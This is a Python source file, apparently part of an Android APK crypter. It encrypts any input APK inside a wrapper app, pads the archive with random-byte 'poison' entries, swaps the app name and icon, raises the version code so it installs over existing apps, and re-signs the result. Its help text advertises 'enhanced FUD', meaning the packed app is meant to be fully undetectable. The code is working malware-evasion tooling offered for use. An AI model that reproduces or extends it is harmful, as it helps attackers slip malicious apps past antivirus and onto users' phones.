def build(apk_bytes, out, fresh_pkg, icon_bytes=None, label=None, kb_manager=None):
    """Build protected APK.

    If kb_manager is provided, uses KB patterns for encryption, poison entries,
    and wrapper structure. Otherwise falls back to defaults.
    """
    if fresh_pkg:
        sys.stderr.write("WARN: --fresh-pkg is DISABLED (broke launcher -> white screen). "
                         "Using shared wrapper package %s\n" % OLD_PKG)
        fresh_pkg = False

    # Get KB patterns if available
    kb_ikm = None
    kb_compression = None
    kb_poison = None
    used_pattern_ids = []

    if kb_manager and _KB_AVAILABLE:
        try:
            # Encryption patterns
            ikm_pat = kb_manager.get_random("encryption", "ikm")
            if ikm_pat:
                kb_ikm = bytes.fromhex(ikm_pat["data"]["value"]) if isinstance(ikm_pat["data"].get("value"), str) else ikm_pat["data"].get("value")
                used_pattern_ids.append(ikm_pat["id"])

            comp_pat = kb_manager.get_random("encryption", "compression")
            if comp_pat:
                kb_compression = comp_pat["data"].get("level", 9)
                used_pattern_ids.append(comp_pat["id"])

            # Poison patterns
            poison_count_pat = kb_manager.get_random("poison", "entry_count")
            poison_count = poison_count_pat["data"].get("count", DEFAULT_POISON_COUNT) if poison_count_pat else DEFAULT_POISON_COUNT
            if poison_count_pat:
                used_pattern_ids.append(poison_count_pat["id"])

            # Generate poison entries from KB patterns
            poison_name_pat = kb_manager.get_random("poison", "entry_name")
            known_names = poison_name_pat["data"].get("names", []) if poison_name_pat else []
            if poison_name_pat:
                used_pattern_ids.append(poison_name_pat["id"])

            kb_poison = generate_poison_entries(poison_count, known_names)

            # NOTE: Wrapper ordering is NOT used from KB - must always use fixed ORDER

            sys.stderr.write("[*] KB: using %d patterns for this build\n" % len(used_pattern_ids))
        except Exception as e:
            sys.stderr.write("[!] KB pattern load failed: %s (using defaults)\n" % e)
            kb_ikm = None
            kb_compression = None
            kb_poison = None
            used_pattern_ids = []

    blob = pack(apk_bytes, kb_ikm=kb_ikm, kb_compression=kb_compression)
    templ = TEMPL
    if fresh_pkg:
        templ = relabel(gen_pkg(len(OLD_PKG)))
    out = os.path.abspath(out)
    tmp = out + ".build.apk"
    if os.path.exists(tmp): os.remove(tmp)
    # Extract version from the encrypted payload's original APK for version bumping
    try:
        orig_apk_path = out + ".orig.apk"
        with open(orig_apk_path, "wb") as f:
            f.write(apk_bytes)
        orig_vc, orig_vn = extract_version_from_apk(orig_apk_path)
        new_vc = orig_vc + VERSION_OFFSET
        sys.stderr.write("[*] version: input=%s(%d) -> wrapper=%s(%d)\n" % (orig_vn, orig_vc, orig_vn, new_vc))
        os.remove(orig_apk_path)
    except Exception:
        new_vc = 999999
        orig_vn = "1.0"
    with zipfile.ZipFile(tmp, "w") as zz:
        # ALWAYS use the fixed ORDER for wrapper - KB ordering breaks the wrapper
        for n in ORDER:
            if n == PAYLOAD_NAME:
                zi = zipfile.ZipInfo(n); zi.compress_type = zipfile.ZIP_DEFLATED
                zz.writestr(zi, blob)
                continue
            meta = templ[n]; data = base64.b64decode(meta["d"])
            if n == "resources.arsc" and label:
                data = patch_name(data, label)
            if n == "AndroidManifest.xml":
                patched = patch_manifest_version(data, new_vc, orig_vn)
                if patched and patched != data:
                    data = patched
            if n == ICON_NAME and icon_bytes is not None:
                data = icon_bytes
            zi = zipfile.ZipInfo(n)
            zi.compress_type = zipfile.ZIP_DEFLATED if meta["compress"] == 8 else zipfile.ZIP_STORED
            zz.writestr(zi, data)
    # poison junk - use KB patterns if available
    poison_entries = kb_poison if kb_poison else POISON
    stag = tempfile.mkdtemp(prefix="poisontmp_")
    for name, size in poison_entries:
        tgt = os.path.join(stag, name)
        os.makedirs(os.path.dirname(tgt) or stag, exist_ok=True)
        with open(tgt, "wb") as f:
            f.write(os.urandom(size))
    # Add poison entries to the APK (cross-platform, no external zip needed)
    with zipfile.ZipFile(os.path.abspath(tmp), "a", compression=zipfile.ZIP_STORED) as zapp:
        for name, _ in poison_entries:
            fpath = os.path.join(stag, name)
            with open(fpath, "rb") as f:
                zapp.writestr(name, f.read())
    aligned = out + ".aligned.apk"
    run([ZIPALIGN, "-f", "4", tmp, aligned])
    run([APKSIGNER, "sign",
         "--ks", KEYSTORE, "--ks-key-alias", KEY_ALIAS,
         "--ks-pass", "pass:" + KEY_PASS, "--key-pass", "pass:" + KEY_PASS,
         "--v1-signing-enabled", "true",
         "--min-sdk-version", "24",
         "--out", out, aligned])
    for f in (tmp, aligned):
        if os.path.exists(f): os.remove(f)
    return blob

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--apk", help="input APK (any)")
    ap.add_argument("-o", "--out", default="protected.apk")
    ap.add_argument("--fresh-pkg", action="store_true", help="rename wrapper to a random package (recommended: installs as new app)")
    ap.add_argument("--label", default=None)
    ap.add_argument("--icon", default=None, help="PNG to use as wrapper app icon (res/drawable/app_icon.png)")
    ap.add_argument("--verify", action="store_true")
    ap.add_argument("--version-code", type=int, default=0, help="override versionCode (default: input APK version + offset)")
    ap.add_argument("--kb", action="store_true", help="use Knowledge Base patterns for enhanced FUD")
    args = ap.parse_args()
    if args.verify:
        b = bytes(input("paste payload-verify: skip (use --apk) ") .encode()) if False else None
        return
    if not args.apk: ap.error("--apk required")
    data = open(args.apk, "rb").read()
    icon = open(args.icon, "rb").read() if args.icon else None
    if icon and not icon[:8] == b"\x89PNG\r\n\x1a\n":
        ap.error("--icon must be a PNG file")

    # Initialize KB manager if requested
    kb_mgr = None
    if args.kb and _KB_AVAILABLE:
        try:
            from database import Database
            db_path = str(Path(__file__).parent / "hathixfud_bot.db")
            db = Database(db_path)
            kb_mgr = KBManager(db)
            print("[*] KB: enabled - using Knowledge Base patterns")
        except Exception as e:
            print("[!] KB: failed to initialize: %s (using defaults)" % e)

    print("[*] input  %s (%d bytes, sha256 %s)" % (args.apk, len(data), hashlib.sha256(data).hexdigest()[:16]))
    blob = build(data, args.out, args.fresh_pkg, icon_bytes=icon, label=args.label, kb_manager=kb_mgr)
    import zipfile as Z
    z = Z.ZipFile(args.out)
    nenc = sum(1 for i in z.infolist() if i.flag_bits & 1)
    print("[*] output %s (%d bytes, %d entries, %d poison)" % (args.out, os.path.getsize(args.out), len(z.infolist()), nenc))
    if icon:
        print("[*] icon   %s (%d bytes) applied to %s" % (args.icon, len(icon), ICON_NAME))
    ok = unpack(blob) == data
    print("[*] payload round-trip == input:", "OK" if ok else "FAIL")
    if args.label:
        print("[*] app name %r patched into resources.arsc (%d-byte slot)"
              % (args.label, len(OLD_NAME)))
    print("[*] version bumping: ENABLED (updates will install over existing)")

if __name__ == "__main__":
    main()
